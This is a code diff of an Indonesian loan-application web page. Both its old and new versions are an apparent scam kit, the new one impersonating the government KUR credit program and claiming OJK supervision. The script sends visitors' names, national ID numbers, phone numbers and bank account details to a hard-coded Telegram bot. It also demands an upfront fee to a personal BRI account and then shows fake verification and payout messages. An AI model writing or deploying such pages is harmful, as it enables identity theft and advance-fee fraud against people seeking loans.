@@ -3,366 +3,283 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WEBSITE PINJAMAN KAMU</title>
+    <title>KUR - Kredit Usaha Rakyat</title>
     <style>
-        body { background: #000; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
-        .container { max-width: 400px; margin: 20px auto; padding: 15px; }
-        .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; margin-bottom: 6px; color: #ffd700; font-size: 14px; }
-        .form-group input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 2px solid #ffd700; 
-            border-radius: 5px; 
-            background: #1a1a1a; 
-            color: #fff; 
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .form-group input::placeholder { color: #ccc; }
-        .btn-next { 
-            width: 100%; 
-            padding: 15px; 
-            background: #ffd700; 
-            color: #000; 
-            border: none; 
-            border-radius: 5px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            font-size: 16px;
-            margin-top: 10px;
-        }
-        .btn-next:hover { background: #fff100; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f8fafc; color: #1e293b; }
         
-        .btn-limit {
-            flex: 1 1 30%;
-            padding: 10px;
-            border: 2px solid #ffd700;
-            border-radius: 5px;
-            background: #1a1a1a;
-            color: #fff;
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.3s;
-            font-size: 14px;
-            margin-bottom: 10px;
+        /* HEADER */
+        header { background: linear-gradient(#0f172a, #1e293b); padding: 25px; text-align: center; color: white; }
+        header h1 { font-size: 28px; margin-bottom: 8px; }
+        header p { font-size: 16px; opacity: 0.9; }
+        
+        /* MAIN CONTENT */
+        .container { max-width: 500px; margin: 25px auto; padding: 0 15px; }
+        
+        /* FORM CARD */
+        .form-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 25px; }
+        .form-title { font-size: 22px; color: #0f172a; text-align: center; margin-bottom: 25px; font-weight: bold; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 15px; }
+        .form-group input, .form-group select { 
+            width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 16px; 
         }
-        .btn-limit.active {
-            background: #ffd700;
-            color: #000;
-            font-weight: bold;
-        }
-        .btn-limit:hover { border-color: #fff100; }
-
-        #bagianLimit {
-            display: none;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 2px solid #ffd700;
-        }
-        h2 { 
-            color: #ffd700; 
-            text-align: center; 
-            font-size: 22px;
-            margin-top: 0;
-        }
-        h3 { 
-            color: #ffd700; 
-            text-align: center; 
-            margin: 0 0 20px 0;
-            font-size: 18px;
-        }
-        .rincian-biaya {
-            background: #1a1a1a;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-        }
-        .rincian-biaya p {
-            display: flex;
-            justify-content: space-between;
-            margin: 8px 0;
-            font-size: 15px;
-        }
-        .rincian-biaya p:last-child {
-            color: #ffd700;
-            font-weight: bold;
-            margin-top: 15px;
-        }
-        .rekening-info {
-            background: #1a1a1a;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .rekening-info p { margin: 8px 0; }
-        .rekening-info p:first-child {
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        .rekening-info .nama-rek { color: #ffd700; font-weight: bold; }
-        .rekening-info .nomor-rek {
-            color: #fff;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        .btn-salin {
-            width: 100%;
-            padding: 10px;
-            background: #ffd700;
-            color: #000;
-            border: none;
-            border-radius: 5px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-        .btn-salin:hover { background: #fff100; }
-        #notifSalin {
-            color: #00ff00;
-            display: none;
-            margin: 5px 0;
-            font-size: 14px;
-        }
-        .btn-konfirmasi {
-            width: 100%;
-            padding: 15px;
-            background: #ffd700;
-            color: #000;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn-konfirmasi:hover { background: #fff100; }
-        #pesanSukses {
-            background: #1a1a1a;
-            padding: 20px;
-            border-radius: 5px;
-            margin: 20px 0;
-            text-align: center;
-            display: none;
-            border: 2px solid #00ff00;
-        }
-        #pesanSukses h4 {
-            color: #00ff00;
-            margin-bottom: 15px;
-            font-size: 18px;
-            margin-top: 0;
-        }
-        #pesanSukses p {
-            color: #fff;
-            line-height: 22px;
-            font-size: 14px;
-            margin: 0;
-        }
+        .form-group input[type="number"] { -moz-appearance: textfield; }
+        .form-group input::-webkit-outer-spin-button, .form-group input::-webkit-inner-spin-button { -webkit-appearance: none; }
+        
+        /* SLIDER */
+        .slider-wrap { margin-bottom: 15px; }
+        .slider-label { display: flex; justify-content: space-between; font-size: 14px; color: #64748b; margin-bottom: 8px; }
+        .range-slider { width: 100%; height: 8px; border-radius: 4px; background: #e2e8f0; outline: none; }
+        .range-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 22px; height: 22px; border-radius: 50%; background: #2563eb; cursor: pointer; }
+        .range-slider::-moz-range-thumb { width: 22px; height: 22px; border-radius: 50%; background: #2563eb; cursor: pointer; }
+        .pinjaman-display { text-align: center; font-size: 20px; font-weight: bold; color: #2563eb; margin-top: 10px; }
+        
+        /* BOX INFO */
+        .biaya-box { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; }
+        .rek-pembayaran { background: #e3f2fd; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; }
+        
+        /* BUTTONS */
+        .btn { width: 100%; padding: 16px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background: #1e88e5; }
+        .btn-copy { padding: 8px 15px; background: #2563eb; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        
+        /* VERIFIKASI BOX */
+        .verifikasi-box { background: #e8f5e9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center; display: none; }
+        
+        /* INFO CARDS */
+        .info-card { background: #2563eb; color: white; padding: 20px; border-radius: 12px; margin-bottom: 25px; }
+        .syarat-card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 25px; }
+        .info-card h3, .syarat-card h3 { text-align: center; margin-bottom: 15px; }
+        ul { padding-left: 20px; line-height: 1.8; }
+        
+        /* FOOTER */
+        footer { background: #0f172a; color: white; text-align: center; padding: 20px; }
     </style>
 </head>
 <body>
+    <header>
+        <h1>KUR - Kredit Usaha Rakyat</h1>
+        <p>Pinjaman Dana Usaha dari Rp5.000.000 hingga Rp1.500.000.000 Berizin di awasi dari OJK</p>
+    </header>
+
     <div class="container">
-        <h2>FORM PENDAFTARAN PINJAMAN</h2>
-        
-        <div class="form-group">
-            <label>Nomor HP</label>
-            <input type="text" id="nomorHP" placeholder="Contoh: 081234567890">
+        <!-- VERIFIKASI PENGAJUAN UTAMA -->
+        <div class="form-card">
+            <h2 class="form-title">FORM PENGAJUAN KUR</h2>
+            
+            <div class="form-group">
+                <label>Nama Lengkap</label>
+                <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap Anda">
+            </div>
+            
+            <div class="form-group">
+                <label>Nomor NIK KTP</label>
+                <input type="number" id="nikKtp" placeholder="Masukkan nomor NIK Anda">
+            </div>
+            
+            <div class="form-group">
+                <label>Nomor HP/WA Aktif</label>
+                <input type="number" id="noHp" placeholder="Masukkan nomor HP/WA">
+            </div>
+            
+            <div class="form-group">
+                <label>Nama Usaha</label>
+                <input type="text" id="namaUsaha" placeholder="Masukkan nama usaha Anda">
+            </div>
+            
+            <div class="form-group">
+                <label>Besar Pinjaman yang Diinginkan</label>
+                <div class="slider-label">
+                    <span>Rp5.000.000</span>
+                    <span>Rp1.500.000.000</span>
+                </div>
+                <input type="range" class="range-slider" id="pinjamanSlider" min="5000000" max="1500000000" step="5000000" value="5000000">
+                <div class="pinjaman-display" id="pinjamanDisplay">Rp5.000.000</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Lama Angsuran (Tenor)</label>
+                <select id="tenorSelect">
+                    <option value="">-- Pilih Tenor --</option>
+                    <option value="3">3 Bulan</option>
+                    <option value="6">6 Bulan</option>
+                    <option value="12">12 Bulan</option>
+                    <option value="24">24 Bulan</option>
+                    <option value="36">36 Bulan</option>
+                    <option value="48">48 Bulan</option>
+                    <option value="60">60 Bulan</option>
+                </select>
+            </div>
+            
+            <div class="biaya-box">
+                <p><strong>Biaya yang Harus Dibayar: <span id="biayaDisplay">Rp250.000</span></strong></p>
+            </div>
+            
+            <div class="rek-pembayaran">
+                <h3>REKENING PEMBAYARAN</h3>
+                <p>Bank BRI • 563801023952503 • Atas Nama: YOSES</p>
+                <button class="btn-copy" onclick="copyRekening()">SALIN REKENING</button>
+                <button class="btn" onclick="lanjutPembayaran()">SILAKAN PEMBAYARAN SEKARANG</button>
+            </div>
+            
+            <!-- KOLOM PEMBAYARAN -->
+            <div id="kolomPembayaran" style="display: none;">
+                <div class="form-group">
+                    <label>Nominal yang Dibayar</label>
+                    <input type="text" id="nominalBayar" readonly>
+                </div>
+                <div class="form-group">
+                    <label>Status Pembayaran</label>
+                    <select id="statusBayar">
+                        <option value="">-- Pilih Status --</option>
+                        <option value="sudah">SUDAH MEMBAYAR</option>
+                        <option value="belum">BELUM MEMBAYAR</option>
+                    </select>
+                </div>
+                <button class="btn" onclick="verifikasiPembayaran()">LANJUTKAN VERIFIKASI</button>
+            </div>
+            
+            <!-- VERIFIKASI BOX -->
+            <div class="verifikasi-box" id="verifikasiBox">
+                <p><strong>VERIFIKASI BERHASIL!</strong></p>
+                <p>Pembayaran Anda telah diverifikasi</p>
+                <button class="btn" onclick="lanjutRekening()">LANJUT KE DATA REKENING PENCAIRAN</button>
+            </div>
         </div>
-        
-        <div class="form-group">
-            <label>Nama Lengkap</label>
-            <input type="text" id="namaLengkap" placeholder="Sesuai nama di KTP">
+
+        <!-- FROM REKENING PENCAIRAN -->
+        <div class="form-card" id="formRekening" style="display: none;">
+            <h2 class="form-title">DATA REKENING PENCAIRAN</h2>
+            
+            <div class="form-group">
+                <label>Nama Bank Pencairan</label>
+                <select id="bankPencairan">
+                    <option value="">-- Pilih Bank --</option>
+                    <option value="BRI">Bank BRI</option>
+                    <option value="Mandiri">Bank Mandiri</option>
+                    <option value="BCA">Bank BCA</option>
+                    <option value="BNI">Bank BNI</option>
+                    <option value="CIMB">Bank CIMB</option>
+                    <option value="Permata">Bank Permata</option>
+                    <option value="Lainnya">Lainnya</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label>Nomor Rekening Pencairan</label>
+                <input type="number" id="noRekPencairan" placeholder="Masukkan nomor rekening">
+            </div>
+            
+            <div class="form-group">
+                <label>Nama Pemilik Rekening</label>
+                <input type="text" id="namaRekPencairan" placeholder="Masukkan nama sesuai rekening">
+            </div>
+            
+            <button class="btn" onclick="ajukanPencairan()">AJUKAN PENCAIRAN SEKARANG</button>
         </div>
-        
-        <div class="form-group">
-            <label>NIK KTP</label>
-            <input type="text" id="nikKTP" placeholder="16 digit nomor NIK">
+
+        <!-- INFO KEUNGGULAN -->
+        <div class="info-card">
+            <h3>KEUNGGULAN PINJAMAN KUR</h3>
+            <ul>
+                <li>Bunga mulai dari 6% per tahun</li>
+                <li>Proses cepat dan persyaratan mudah</li>
+                <li>Tidak perlu agunan tambahan</li>
+                <li>Tenor fleksibel hingga 5 tahun</li>
+            </ul>
         </div>
 
-        <button class="btn-next" onclick="tampilkanBagianLimit()">LANJUT KE PILIH LIMIT PINJAMAN</button>
-
-        <div id="bagianLimit">
-            <h3>PILIH JUMLAH PINJAMAN</h3>
-
-            <div style="display:flex; flex-wrap:wrap; gap:10px; margin:20px 0;">
-                <button class="btn-limit active" onclick="pilihLimit(10000000)">Rp 10.000.000</button>
-                <button class="btn-limit" onclick="pilihLimit(25000000)">Rp 25.000.000</button>
-                <button class="btn-limit" onclick="pilihLimit(50000000)">Rp 50.000.000</button>
-                <button class="btn-limit" onclick="pilihLimit(100000000)">Rp 100.000.000</button>
-                <button class="btn-limit" onclick="pilihLimit(150000000)">Rp 150.000.000</button>
-                <button class="btn-limit" onclick="pilihLimit(250000000)">Rp 250.000.000</button>
-            </div>
-
-            <div class="rincian-biaya">
-                <p><span>Jumlah Pinjaman:</span> <span id="txtLimit">Rp 10.000.000</span></p>
-                <p><span>Biaya Admin (1%):</span> <span id="txtBiaya">Rp 100.000</span></p>
-                <p><span>TOTAL YANG HARUS DIBAYAR:</span> <span id="txtTotal">Rp 10.100.000</span></p>
-            </div>
-
-            <div class="rekening-info">
-                <p>REKENING TUJUAN PEMBAYARAN</p>
-                <p>Atas Nama: <span class="nama-rek">YOSES</span></p>
-                <p class="nomor-rek" id="nomorRek">563801023952503</p>
-                <p>Bank: <span class="nama-rek">BRI</span></p>
-                
-                <button class="btn-salin" onclick="salinRekening()">SALIN NOMOR REKENING</button>
-                <div id="notifSalin">✅ Nomor rekening berhasil disalin!</div>
-            </div>
-
-            <button class="btn-konfirmasi" onclick="konfirmasiPembayaran()">SAYA SUDAH MELAKUKAN PEMBAYARAN</button>
-
-            <div id="pesanSukses">
-                <h4>✅ PEMBAYARAN BERHASIL</h4>
-                <p>
-                    Terima kasih telah melakukan pembayaran untuk pinjaman Anda.<br>
-                    Pembayaran ke rekening YOSES (BRI - 563801023952503) telah kami terima dan akan diakumulasikan secara otomatis sesuai dengan biaya yang telah ditetapkan (1% biaya admin).<br>
-                    Dana pinjaman akan kami kirimkan ke rekening yang Anda daftarkan setelah proses verifikasi selesai.
-                </p>
-            </div>
+        <!-- INFO SYARAT -->
+        <div class="syarat-card">
+            <h3>PERSYARATAN PENGAJUAN</h3>
+            <ul>
+                <li>KTP Asli yang masih berlaku</li>
+                <li>Surat Keterangan Usaha (SKU/SIUP/NIB)</li>
+            </ul>
         </div>
     </div>
 
+    <footer>
+        <p>KUR - Kredit Usaha Rakyat | Hubungi Cs: 0858-0988-1886</p>
+    </footer>
+
     <script>
-        // KONFIGURASI BOT DAN ID TELEGRAM
-        const TELEGRAM_BOT_TOKEN = "7817936026:AAFopsXUn5gVeagUKQrf4WatPC4lS3JhVwM";
-        const TELEGRAM_CHAT_ID = "8086284184";
-        const API_TELEGRAM = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        // KONFIGURASI TELEGRAM
+        const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
+        const CHAT_ID = "8571321926";
 
-        // FUNGSI UNTUK KIRIM DATA KE TELEGRAM
-        async function kirimKeTelegram(pesan) {
-            try {
-                const response = await fetch(API_TELEGRAM, {
-                    method: "POST",
-                    headers: { 
-                        "Content-Type": "application/json" 
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: pesan,
-                        disable_web_page_preview: true
-                    })
-                });
-                if (response.ok) {
-                    console.log("✅ Data berhasil dikirim ke Telegram!");
-                } else {
-                    console.log("⚠️ Gagal mengirim data, cek kembali bot dan ID Telegram");
-                }
-            } catch (error) {
-                console.log("❌ Error saat mengirim data:", error);
-            }
-        }
-
-        // FUNGSI TOMBOL LANJUT KE PILIHAN LIMIT
-        function tampilkanBagianLimit() {
-            document.getElementById('bagianLimit').style.display = "block";
-            
-            // AMBIL DATA DARI FORM AWAL
-            const nomorHP = document.getElementById('nomorHP').value || "- Belum diisi -";
-            const namaLengkap = document.getElementById('namaLengkap').value || "- Belum diisi -";
-            const nikKTP = document.getElementById('nikKTP').value || "- Belum diisi -";
-            const waktuSekarang = new Date().toLocaleString('id-ID', {
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-
-            // PESAN YANG AKAN DIKIRIM
-            const pesan = `
-📝 DATA PENDAFTARAN PINJAMAN - LANGKAH 1 📝
-📱 Nomor HP: ${nomorHP}
-👤 Nama Lengkap: ${namaLengkap}
-🆔 NIK KTP: ${nikKTP}
-⏰ Waktu: ${waktuSekarang}
-            `;
-            kirimKeTelegram(pesan);
-        }
-
-        // FUNGSI FORMAT ANGKA MENJADI RUPIAH
-        function formatRupiah(angka) {
-            return "Rp " + angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-        }
-
-        // FUNGSI PILIH LIMIT PINJAMAN
-        let limitTerpilih = 10000000;
-        function pilihLimit(jumlah) {
-            // UBAH STATUS TOMBOL
-            document.querySelectorAll('.btn-limit').forEach(btn => btn.classList.remove('active'));
-            event.target.classList.add('active');
-
-            // HITUNG BIAYA
-            limitTerpilih = jumlah;
-            const biayaAdmin = jumlah * 0.01;
-            const totalBayar = jumlah + biayaAdmin;
-
-            // TAMPILKAN KE LAYAR
-            document.getElementById('txtLimit').textContent = formatRupiah(jumlah);
-            document.getElementById('txtBiaya').textContent = formatRupiah(biayaAdmin);
-            document.getElementById('txtTotal').textContent = formatRupiah(totalBayar);
-
-            // PESAN YANG AKAN DIKIRIM
-            const waktuSekarang = new Date().toLocaleString('id-ID', {
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-            const pesan = `
-💹 DATA LIMIT PINJAMAN - LANGKAH 2 💹
-💵 Jumlah Pinjaman: ${formatRupiah(jumlah)}
-💱 Biaya Admin (1%): ${formatRupiah(biayaAdmin)}
-💰 Total Yang Harus Dibayar: ${formatRupiah(totalBayar)}
-⏰ Waktu: ${waktuSekarang}
-            `;
-            kirimKeTelegram(pesan);
-        }
-
-        // FUNGSI SALIN NOMOR REKENING
-        function salinRekening() {
-            const nomorRek = document.getElementById('nomorRek').textContent;
-            const rekLengkap = `Atas Nama: YOSES | Nomor: ${nomorRek} | Bank: BRI`;
-            
-            // SALIN KE KLIPBOARD
-            navigator.clipboard.writeText(rekLengkap)
-                .then(() => {
-                    document.getElementById('notifSalin').style.display = "block";
-                    setTimeout(() => {
-                        document.getElementById('notifSalin').style.display = "none";
-                    }, 3000);
-                })
-                .catch(err => {
-                    alert("Gagal menyalin rekening! Silakan salin secara manual.");
-                });
-
-            // PESAN YANG AKAN DIKIRIM
-            const waktuSekarang = new Date().toLocaleString('id-ID', {
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-            const pesan = `
-🔔 INFO REKENING PEMBAYARAN - LANGKAH 3 🔔
-🏦 Rekening Tujuan: ${rekLengkap}
-⏰ Waktu: ${waktuSekarang}
-📝 Aksi: Pengguna menyalin nomor rekening
-            `;
-            kirimKeTelegram(pesan);
-        }
-
-        // FUNGSI KONFIRMASI PEMBAYARAN
-        function konfirmasiPembayaran() {
-            document.getElementById('pesanSukses').style.display = "block";
-
-            // AMBIL SEMUA DATA
-            const nomorHP = document.getElementById('nomorHP').value || "- Belum di
+        // SLIDER PINJAMAN
+        const slider = document.getElementById('pinjamanSlider');
+        const pinjamanDisplay = document.getElementById('pinjamanDisplay');
+        const biayaDisplay = document.getElementById('biayaDisplay');
         
+        slider.addEventListener('input', function() {
+            let nilai = parseInt(this.value);
+            let formatNilai = new Intl.NumberFormat('id-ID').format(nilai);
+            pinjamanDisplay.textContent = `Rp${formatNilai}`;
+            biayaDisplay.textContent = `Rp${new Intl.NumberFormat('id-ID').format(nilai * 0.05)}`;
+        });
+
+        // FUNGSI COPY REKENING
+        function copyRekening() {
+            navigator.clipboard.writeText("Bank BRI • 563801023952503 • Atas Nama: YOSES");
+            alert("Rekening berhasil disalin!");
+        }
+
+        // FUNGSI KIRIM KE TELEGRAM
+        async function kirimKeTelegram(pesan) {
+            const pesanEncode = encodeURIComponent(pesan);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesanEncode}`);
+        }
+
+        // TOMBOL PEMBAYARAN
+        function lanjutPembayaran() {
+            document.getElementById('kolomPembayaran').style.display = 'block';
+            document.getElementById('nominalBayar').value = biayaDisplay.textContent;
+            
+            // KIRIM DATA KE TELEGRAM
+            const pesan = `📋 DATA PENGAJUAN KUR
+Nama Lengkap: ${document.getElementById('namaLengkap').value}
+NIK KTP: ${document.getElementById('nikKtp').value}
+Nomor HP: ${document.getElementById('noHp').value}
+Nama Usaha: ${document.getElementById('namaUsaha').value}
+Besar Pinjaman: ${pinjamanDisplay.textContent}
+Tenor: ${document.getElementById('tenorSelect').value || 'Belum dipilih'}
+Biaya: ${biayaDisplay.textContent}`;
+            kirimKeTelegram(pesan);
+        }
+
+        // TOMBOL VERIFIKASI
+        function verifikasiPembayaran() {
+            document.getElementById('verifikasiBox').style.display = 'block';
+            
+            // KIRIM DATA STATUS PEMBAYARAN
+            const pesan = `💳 STATUS PEMBAYARAN
+Nominal Dibayar: ${document.getElementById('nominalBayar').value}
+Status: ${document.getElementById('statusBayar').value || 'Belum dipilih'}`;
+            kirimKeTelegram(pesan);
+        }
+
+        // TOMBOL LANJUT REKENING
+        function lanjutRekening() {
+            document.getElementById('formRekening').style.display = 'block';
+        }
+
+        // TOMBOL PENCAIRAN
+        function ajukanPencairan() {
+            // KIRIM DATA REKENING PENCAIRAN
+            const pesan = `💸 DATA PENCAIRAN KUR
+Bank Pencairan: ${document.getElementById('bankPencairan').value || 'Belum dipilih'}
+Nomor Rekening: ${document.getElementById('noRekPencairan').value || 'Belum diisi'}
+Nama Pemilik: ${document.getElementById('namaRekPencairan').value || 'Belum diisi'}`;
+            kirimKeTelegram(pesan);
+            alert("Pengajuan pencairan berhasil! Data anda sudah  diverifikasi Untuk Uang  Pencairan anda 1x24 jam cek rekening anda secara berkala PUSAT BANTUAN HUBUNGI KUR CS.WA:085809881886 
+             ");
+        }
+    </script>
+</body>
+</html>
+
+
+
